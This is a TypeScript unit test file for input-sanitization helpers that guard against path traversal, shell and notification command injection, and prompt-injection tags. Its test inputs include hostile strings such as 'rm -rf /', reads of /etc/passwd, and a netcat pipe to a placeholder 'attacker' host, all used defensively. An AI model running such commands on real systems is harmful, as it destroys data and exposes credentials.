/**
 * Security Sanitization Tests
 *
 * CRITICAL: These functions protect against injection attacks.
 * All tests must pass before any security-related code changes.
 */
import { describe, test, expect } from "bun:test"

import {
  sanitizeSessionId,
  sanitizeKey,
  isPathWithinRoot,
  sanitizeForPrompt,
  escapeAngleBrackets,
} from "../utils/state"

import { sanitizeNotificationContent } from "../notification"

// ============================================================================
// sanitizeSessionId Tests
// ============================================================================
describe("sanitizeSessionId", () => {
  describe("allowed characters", () => {
    test("allows alphanumeric characters", () => {
      expect(sanitizeSessionId("abc123XYZ")).toBe("abc123XYZ")
    })

    test("allows dashes", () => {
      expect(sanitizeSessionId("session-123-abc")).toBe("session-123-abc")
    })

    test("allows underscores", () => {
      expect(sanitizeSessionId("session_123_abc")).toBe("session_123_abc")
    })

    test("allows mixed valid characters", () => {
      expect(sanitizeSessionId("my-session_2024-01")).toBe("my-session_2024-01")
    })
  })

  describe("path traversal blocking", () => {
    test("removes path traversal sequences", () => {
      expect(sanitizeSessionId("../../../etc/passwd")).toBe("etcpasswd")
    })

    test("removes double dots and returns unknown when empty", () => {
      // ".." becomes "" after sanitization, then returns "unknown"
      expect(sanitizeSessionId("..")).toBe("unknown")
    })

    test("removes forward slashes", () => {
      expect(sanitizeSessionId("path/to/file")).toBe("pathtofile")
    })

    test("removes backslashes", () => {
      expect(sanitizeSessionId("path\\to\\file")).toBe("pathtofile")
    })

    test("handles complex traversal attempts", () => {
      expect(sanitizeSessionId("....//....//etc/passwd")).toBe("etcpasswd")
    })

    test("removes encoded traversal attempts", () => {
      // %2e = . and %2f = /
      expect(sanitizeSessionId("%2e%2e%2f%2e%2e%2f")).toBe("2e2e2f2e2e2f")
    })
  })

  describe("shell metacharacter removal", () => {
    test("removes command substitution with $()", () => {
      expect(sanitizeSessionId("$(whoami)")).toBe("whoami")
    })

    test("removes command substitution with backticks", () => {
      expect(sanitizeSessionId("`whoami`")).toBe("whoami")
    })

    test("removes pipe operator", () => {
      expect(sanitizeSessionId("session|cat /etc/passwd")).toBe("sessioncatetcpasswd")
    })

    test("removes semicolon command separator", () => {
      expect(sanitizeSessionId("session;rm -rf /")).toBe("sessionrm-rf")
    })

    test("removes ampersand", () => {
      expect(sanitizeSessionId("session&echo pwned")).toBe("sessionechopwned")
    })

    test("removes dollar sign", () => {
      expect(sanitizeSessionId("$HOME")).toBe("HOME")
    })

    test("removes all special shell characters", () => {
      const malicious = "session$(id)`id`|;&<>{}[]!@#$%^*+=~"
      const result = sanitizeSessionId(malicious)
      expect(result).not.toContain("$")
      expect(result).not.toContain("`")
      expect(result).not.toContain("|")
      expect(result).not.toContain(";")
      expect(result).not.toContain("&")
      expect(result).not.toContain("<")
      expect(result).not.toContain(">")
      expect(result).not.toContain("{")
      expect(result).not.toContain("}")
      expect(result).not.toContain("[")
      expect(result).not.toContain("]")
    })
  })

  describe("length truncation", () => {
    test("truncates to 64 characters", () => {
      const longId = "a".repeat(100)
      expect(sanitizeSessionId(longId).length).toBe(64)
    })

    test("does not truncate short strings", () => {
      const shortId = "a".repeat(30)
      expect(sanitizeSessionId(shortId).length).toBe(30)
    })

    test("exactly 64 characters passes through", () => {
      const exactId = "a".repeat(64)
      expect(sanitizeSessionId(exactId).length).toBe(64)
    })
  })

  describe("empty result handling", () => {
    test("returns 'unknown' for empty string", () => {
      expect(sanitizeSessionId("")).toBe("unknown")
    })

    test("returns 'unknown' when all characters are stripped", () => {
      expect(sanitizeSessionId("!@#$%^&*()")).toBe("unknown")
    })

    test("returns 'unknown' for only dots and slashes", () => {
      expect(sanitizeSessionId("../../../")).toBe("unknown")
    })

    test("returns 'unknown' for only special characters", () => {
      expect(sanitizeSessionId("$()`|;&<>")).toBe("unknown")
    })
  })

  describe("edge cases", () => {
    test("handles unicode characters by removing them", () => {
      expect(sanitizeSessionId("session-\u0000\u001f-test")).toBe("session--test")
    })

    test("handles null bytes", () => {
      expect(sanitizeSessionId("session\x00test")).toBe("sessiontest")
    })

    test("handles newlines", () => {
      expect(sanitizeSessionId("session\ntest")).toBe("sessiontest")
    })

    test("handles carriage returns", () => {
      expect(sanitizeSessionId("session\rtest")).toBe("sessiontest")
    })

    test("handles tabs", () => {
      expect(sanitizeSessionId("session\ttest")).toBe("sessiontest")
    })
  })
})

// ============================================================================
// sanitizeKey Tests
// ============================================================================
describe("sanitizeKey", () => {
  describe("allowed characters", () => {
    test("allows alphanumeric characters", () => {
      expect(sanitizeKey("myKey123")).toBe("myKey123")
    })

    test("allows underscores", () => {
      expect(sanitizeKey("my_key_name")).toBe("my_key_name")
    })

    test("allows dashes", () => {
      expect(sanitizeKey("my-key-name")).toBe("my-key-name")
    })

    test("allows mixed valid characters", () => {
      expect(sanitizeKey("my_key-123")).toBe("my_key-123")
    })
  })

  describe("path character removal", () => {
    test("removes forward slashes", () => {
      expect(sanitizeKey("path/to/key")).toBe("pathtokey")
    })

    test("removes backslashes", () => {
      expect(sanitizeKey("path\\to\\key")).toBe("pathtokey")
    })

    test("removes dots", () => {
      expect(sanitizeKey("key.name.json")).toBe("keynamejson")
    })

    test("removes path traversal attempts", () => {
      expect(sanitizeKey("../../../secret")).toBe("secret")
    })
  })

  describe("special character removal", () => {
    test("removes spaces", () => {
      expect(sanitizeKey("my key")).toBe("mykey")
    })

    test("removes colons", () => {
      expect(sanitizeKey("C:key")).toBe("Ckey")
    })

    test("removes quotes", () => {
      expect(sanitizeKey('key"test')).toBe("keytest")
      expect(sanitizeKey("key'test")).toBe("keytest")
    })

    test("removes shell metacharacters", () => {
      expect(sanitizeKey("key$(cmd)")).toBe("keycmd")
      expect(sanitizeKey("key`cmd`")).toBe("keycmd")
    })
  })

  describe("length and empty handling", () => {
    test("truncates to 64 characters", () => {
      const longKey = "k".repeat(100)
      expect(sanitizeKey(longKey).length).toBe(64)
    })

    test("returns 'default' for empty string", () => {
      expect(sanitizeKey("")).toBe("default")
    })

    test("returns 'default' when all characters stripped", () => {
      expect(sanitizeKey("!@#$%^&*()")).toBe("default")
    })
  })
})

// ============================================================================
// isPathWithinRoot Tests
// ============================================================================
describe("isPathWithinRoot", () => {
  const rootPath = "/project/root"

  describe("valid paths within root", () => {
    test("direct child returns true", () => {
      expect(isPathWithinRoot("/project/root/file.txt", rootPath)).toBe(true)
    })

    test("nested path returns true", () => {
      expect(isPathWithinRoot("/project/root/src/utils/file.ts", rootPath)).toBe(true)
    })

    test("root path itself returns true", () => {
      expect(isPathWithinRoot("/project/root", rootPath)).toBe(true)
    })

    test("root path with trailing slash returns true", () => {
      expect(isPathWithinRoot("/project/root/", rootPath)).toBe(true)
    })
  })

  describe("path traversal blocking", () => {
    test("parent directory traversal returns false", () => {
      expect(isPathWithinRoot("/project/root/../secret", rootPath)).toBe(false)
    })

    test("multiple parent traversals return false", () => {
      expect(isPathWithinRoot("/project/root/../../etc/passwd", rootPath)).toBe(false)
    })

    test("traversal then back in returns false", () => {
      // /project/root/../root2 resolves to /project/root2, not /project/root
      expect(isPathWithinRoot("/project/root/../root2/file", rootPath)).toBe(false)
    })

    test("hidden traversal in middle returns false", () => {
      expect(isPathWithinRoot("/project/root/subdir/../../secret", rootPath)).toBe(false)
    })
  })

  describe("absolute path outside root", () => {
    test("completely different path returns false", () => {
      expect(isPathWithinRoot("/etc/passwd", rootPath)).toBe(false)
    })

    test("sibling directory returns false", () => {
      expect(isPathWithinRoot("/project/other/file.txt", rootPath)).toBe(false)
    })

    test("parent directory returns false", () => {
      expect(isPathWithinRoot("/project", rootPath)).toBe(false)
    })

    test("partial match prefix returns false", () => {
      // /project/root-other is not within /project/root
      expect(isPathWithinRoot("/project/root-other/file", rootPath)).toBe(false)
    })
  })

  describe("symlink-like path handling", () => {
    test("path with symlink name pattern handled correctly", () => {
      // Just testing the path logic - actual symlink resolution is OS-dependent
      expect(isPathWithinRoot("/project/root/link/file", rootPath)).toBe(true)
    })
  })

  describe("edge cases", () => {
    test("empty file path", () => {
      // Empty resolves to cwd, which is unlikely to be within root
      const result = isPathWithinRoot("", rootPath)
      expect(typeof result).toBe("boolean")
    })

    test("relative path resolves correctly", () => {
      // When checking relative path against a specific root
      const result = isPathWithinRoot("./subdir/file.txt", "/tmp/test-root")
      // Relative paths resolve against cwd, which is outside /tmp/test-root
      expect(result).toBe(false)
    })
  })
})

// ============================================================================
// sanitizeForPrompt Tests
// ============================================================================
describe("sanitizeForPrompt", () => {
  describe("normal content passthrough", () => {
    test("plain text passes through", () => {
      expect(sanitizeForPrompt("Hello world")).toBe("Hello world")
    })

    test("numbers and punctuation pass through", () => {
      expect(sanitizeForPrompt("Test 123! How are you?")).toBe("Test 123! How are you?")
    })

    test("newlines are preserved", () => {
      expect(sanitizeForPrompt("Line 1\nLine 2")).toBe("Line 1\nLine 2")
    })
  })

  describe("angle bracket escaping", () => {
    test("escapes less-than sign", () => {
      expect(sanitizeForPrompt("<")).toBe("&lt;")
    })

    test("escapes greater-than sign", () => {
      expect(sanitizeForPrompt(">")).toBe("&gt;")
    })

    test("escapes HTML-like tags", () => {
      expect(sanitizeForPrompt("<script>alert('xss')</script>")).toBe(
        "&lt;script&gt;alert('xss')&lt;/script&gt;"
      )
    })

    test("escapes XML-like tags", () => {
      expect(sanitizeForPrompt("<user>data</user>")).toBe("&lt;user&gt;data&lt;/user&gt;")
    })
  })

  describe("length truncation", () => {
    test("truncates to default 500 characters", () => {
      const longContent = "a".repeat(1000)
      expect(sanitizeForPrompt(longContent).length).toBe(500)
    })

    test("truncates to custom maxLength", () => {
      const longContent = "a".repeat(100)
      expect(sanitizeForPrompt(longContent, 50).length).toBe(50)
    })

    test("does not truncate short content", () => {
      expect(sanitizeForPrompt("short", 500)).toBe("short")
    })

    test("truncation happens after escaping", () => {
      // "<" becomes "&lt;" (4 chars)
      const content = "<".repeat(200)
      const result = sanitizeForPrompt(content, 100)
      // 200 * 4 = 800 chars after escape, then truncated to 100
      expect(result.length).toBe(100)
    })
  })
})

// ============================================================================
// escapeAngleBrackets Tests
// ============================================================================
describe("escapeAngleBrackets", () => {
  describe("basic escaping", () => {
    test("escapes single less-than", () => {
      expect(escapeAngleBrackets("<")).toBe("&lt;")
    })

    test("escapes single greater-than", () => {
      expect(escapeAngleBrackets(">")).toBe("&gt;")
    })

    test("escapes both in sequence", () => {
      expect(escapeAngleBrackets("<>")).toBe("&lt;&gt;")
    })
  })

  describe("script tag escaping", () => {
    test("escapes script tags", () => {
      expect(escapeAngleBrackets("<script>")).toBe("&lt;script&gt;")
    })

    test("escapes closing script tags", () => {
      expect(escapeAngleBrackets("</script>")).toBe("&lt;/script&gt;")
    })

    test("escapes full script block", () => {
      expect(escapeAngleBrackets("<script>alert(1)</script>")).toBe(
        "&lt;script&gt;alert(1)&lt;/script&gt;"
      )
    })
  })

  describe("prompt injection prevention", () => {
    test("escapes MANDATORY-USER-MESSAGE tag", () => {
      expect(escapeAngleBrackets("<MANDATORY-USER-MESSAGE>")).toBe(
        "&lt;MANDATORY-USER-MESSAGE&gt;"
      )
    })

    test("escapes system prompt tags", () => {
      expect(escapeAngleBrackets("<system>")).toBe("&lt;system&gt;")
    })

    test("escapes assistant tags", () => {
      expect(escapeAngleBrackets("<assistant>")).toBe("&lt;assistant&gt;")
    })

    test("escapes human tags", () => {
      expect(escapeAngleBrackets("<human>")).toBe("&lt;human&gt;")
    })
  })

  describe("nested tag escaping", () => {
    test("escapes nested tags", () => {
      expect(escapeAngleBrackets("<outer><inner></inner></outer>")).toBe(
        "&lt;outer&gt;&lt;inner&gt;&lt;/inner&gt;&lt;/outer&gt;"
      )
    })

    test("escapes deeply nested tags", () => {
      const input = "<a><b><c>content</c></b></a>"
      const expected = "&lt;a&gt;&lt;b&gt;&lt;c&gt;content&lt;/c&gt;&lt;/b&gt;&lt;/a&gt;"
      expect(escapeAngleBrackets(input)).toBe(expected)
    })

    test("escapes malformed nested tags", () => {
      expect(escapeAngleBrackets("<<>>")).toBe("&lt;&lt;&gt;&gt;")
    })
  })

  describe("mixed content", () => {
    test("preserves non-angle-bracket content", () => {
      expect(escapeAngleBrackets("Hello <world> test")).toBe("Hello &lt;world&gt; test")
    })

    test("handles multiple tags in text", () => {
      const input = "Say <hello> and <goodbye>"
      const expected = "Say &lt;hello&gt; and &lt;goodbye&gt;"
      expect(escapeAngleBrackets(input)).toBe(expected)
    })
  })

  describe("edge cases", () => {
    test("empty string returns empty", () => {
      expect(escapeAngleBrackets("")).toBe("")
    })

    test("string without brackets unchanged", () => {
      expect(escapeAngleBrackets("no brackets here")).toBe("no brackets here")
    })

    test("already escaped content gets double-escaped", () => {
      // This is expected behavior - we escape ALL angle brackets
      expect(escapeAngleBrackets("&lt;")).toBe("&lt;")
      expect(escapeAngleBrackets("&gt;")).toBe("&gt;")
    })
  })
})

// ============================================================================
// sanitizeNotificationContent Tests
// ============================================================================
describe("sanitizeNotificationContent", () => {
  describe("allowed characters", () => {
    test("allows alphanumeric characters", () => {
      expect(sanitizeNotificationContent("Hello123")).toBe("Hello123")
    })

    test("allows spaces", () => {
      expect(sanitizeNotificationContent("Hello World")).toBe("Hello World")
    })

    test("allows period", () => {
      expect(sanitizeNotificationContent("Done.")).toBe("Done.")
    })

    test("allows comma", () => {
      expect(sanitizeNotificationContent("Hello, World")).toBe("Hello, World")
    })

    test("allows exclamation mark", () => {
      expect(sanitizeNotificationContent("Success!")).toBe("Success!")
    })

    test("allows question mark", () => {
      expect(sanitizeNotificationContent("Ready?")).toBe("Ready?")
    })

    test("allows colon", () => {
      expect(sanitizeNotificationContent("Status: OK")).toBe("Status: OK")
    })

    test("allows semicolon", () => {
      expect(sanitizeNotificationContent("Step 1; Step 2")).toBe("Step 1; Step 2")
    })

    test("allows parentheses", () => {
      expect(sanitizeNotificationContent("Done (finally)")).toBe("Done (finally)")
    })

    test("allows dash/hyphen", () => {
      expect(sanitizeNotificationContent("Task - complete")).toBe("Task - complete")
    })
  })

  describe("shell metacharacter removal", () => {
    test("removes dollar sign", () => {
      expect(sanitizeNotificationContent("$HOME")).toBe("HOME")
    })

    test("removes backticks", () => {
      expect(sanitizeNotificationContent("`whoami`")).toBe("whoami")
    })

    test("removes pipe", () => {
      expect(sanitizeNotificationContent("test|cat")).toBe("testcat")
    })

    test("removes ampersand", () => {
      expect(sanitizeNotificationContent("test&echo")).toBe("testecho")
    })

    test("removes less-than", () => {
      expect(sanitizeNotificationContent("test<file")).toBe("testfile")
    })

    test("removes greater-than", () => {
      expect(sanitizeNotificationContent("test>file")).toBe("testfile")
    })

    test("removes curly braces", () => {
      expect(sanitizeNotificationContent("{test}")).toBe("test")
    })

    test("removes square brackets", () => {
      expect(sanitizeNotificationContent("[test]")).toBe("test")
    })
  })

  describe("command substitution neutralization", () => {
    test("neutralizes $(command) pattern by removing $", () => {
      const result = sanitizeNotificationContent("$(whoami)")
      // $ is removed, but () are allowed for readability in notifications
      expect(result).not.toContain("$")
      expect(result).toBe("(whoami)")
    })

    test("neutralizes `command` pattern", () => {
      const result = sanitizeNotificationContent("`id`")
      expect(result).not.toContain("`")
      expect(result).toBe("id")
    })

    test("neutralizes nested command substitution by removing $", () => {
      const result = sanitizeNotificationContent("$(echo $(whoami))")
      // $ removed but parentheses allowed - without $ they're harmless
      expect(result).not.toContain("$")
      expect(result).toBe("(echo (whoami))")
    })

    test("neutralizes mixed substitution", () => {
      const result = sanitizeNotificationContent("$(`id`)")
      expect(result).not.toContain("$")
      expect(result).not.toContain("`")
      expect(result).toBe("(id)")
    })
  })

  describe("unicode and emoji removal", () => {
    test("removes emoji", () => {
      expect(sanitizeNotificationContent("Done! \u{1F389}")).toBe("Done! ")
    })

    test("removes unicode special characters", () => {
      expect(sanitizeNotificationContent("Test\u2028Line")).toBe("TestLine")
    })

    test("removes non-ASCII characters", () => {
      expect(sanitizeNotificationContent("Caf\u00E9")).toBe("Caf")
    })

    test("removes zero-width characters", () => {
      expect(sanitizeNotificationContent("test\u200Bword")).toBe("testword")
    })
  })

  describe("length truncation", () => {
    test("truncates to default 100 characters", () => {
      const longContent = "a".repeat(200)
      expect(sanitizeNotificationContent(longContent).length).toBe(100)
    })

    test("truncates to custom maxLength", () => {
      const longContent = "a".repeat(100)
      expect(sanitizeNotificationContent(longContent, 50).length).toBe(50)
    })

    test("does not truncate short content", () => {
      expect(sanitizeNotificationContent("short", 100)).toBe("short")
    })

    test("truncation happens after sanitization", () => {
      // "$$$aaa" -> "aaa" (3 chars) - no truncation needed
      expect(sanitizeNotificationContent("$$$aaa", 10)).toBe("aaa")
    })
  })

  describe("complex attack patterns", () => {
    test("handles osascript injection attempt", () => {
      const malicious = '"; do shell script "rm -rf /"'
      const result = sanitizeNotificationContent(malicious)
      expect(result).not.toContain('"')
      expect(result).not.toContain("/")
    })

    test("handles notify-send injection attempt", () => {
      const malicious = "test' && rm -rf / '"
      const result = sanitizeNotificationContent(malicious)
      expect(result).not.toContain("'")
      expect(result).not.toContain("/")
      expect(result).not.toContain("&")
    })

    test("handles PowerShell injection attempt", () => {
      const malicious = '"; Invoke-Expression "malicious" "'
      const result = sanitizeNotificationContent(malicious)
      // Quotes are removed (critical for injection), semicolons allowed for readability
      expect(result).not.toContain('"')
      // Without quotes, the semicolon can't break out of the string context
      expect(result).toBe("; Invoke-Expression malicious ")
    })

    test("handles multiple injection vectors", () => {
      const malicious = "$(rm -rf /)`cat /etc/passwd`|nc attacker 1234"
      const result = sanitizeNotificationContent(malicious)
      expect(result).not.toContain("$")
      expect(result).not.toContain("`")
      expect(result).not.toContain("|")
      expect(result).not.toContain("/")
    })
  })

  describe("edge cases", () => {
    test("empty string returns empty", () => {
      expect(sanitizeNotificationContent("")).toBe("")
    })

    test("only special characters returns empty", () => {
      expect(sanitizeNotificationContent("$`|&<>{}[]")).toBe("")
    })

    test("preserves valid notification message", () => {
      expect(sanitizeNotificationContent("Task completed successfully!")).toBe(
        "Task completed successfully!"
      )
    })

    test("handles null bytes", () => {
      expect(sanitizeNotificationContent("test\x00content")).toBe("testcontent")
    })

    test("handles zero maxLength", () => {
      expect(sanitizeNotificationContent("test", 0)).toBe("")
    })

    test("handles negative maxLength by treating as zero", () => {
      // Negative maxLength is guarded with Math.max(0, maxLength)
      const result = sanitizeNotificationContent("test", -1)
      expect(result).toBe("")
    })
  })
})
